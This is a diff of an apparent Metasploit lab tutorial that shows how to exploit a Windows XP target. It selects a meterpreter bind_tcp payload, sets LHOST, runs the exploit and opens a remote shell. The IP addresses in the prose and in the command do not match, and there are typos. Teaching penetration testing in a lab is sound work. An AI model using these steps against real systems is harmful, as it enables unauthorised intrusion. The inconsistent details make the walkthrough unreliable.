@@ -44,9 +44,9 @@ Now that we can see what payloads are available, we can select the generic/shell
 `msf > set PAYLOAD windows/meterpreter/bind_tcp`
 
 ## Set LocalHost
-Now that we can see what payloads are available, we can select the generic/shell_reverse_tcp by using the Metasploit console set command. If successful, this will establish a remote shell on the target system that we can command.
+Now that we've chosen the exploit and the payload, we need to tell Metasploit the IP address of our machine. In this example, our system has an IP address of `10.0.10.6`. Use the actual IP address of the system you using. Tools such as `sudo ifconfig` should help you find your IP Address. It should be in the format of `10.0.10.X`
 
-`msf > set PAYLOAD generic/shell_reverse_tcp`
+`msf > set LHOST 10.0.0.6`
 
 ## Exploit 
 Now we command Metasploit to exploit the system:
@@ -54,9 +54,7 @@ Now we command Metasploit to exploit the system:
 `msf > exploit`
 
 ## Open a shell! 
-Type the command sessions –i 1 to open a command shell on the XP system that will appear on your Metasploit console.
-
-`sessions –i 1`
+This should open up a metaterpeter shell. 
 
 To confirm that the command shell is on the Windows XP system, type dir to get a directory listing on the Windows XP system that you now own!
 
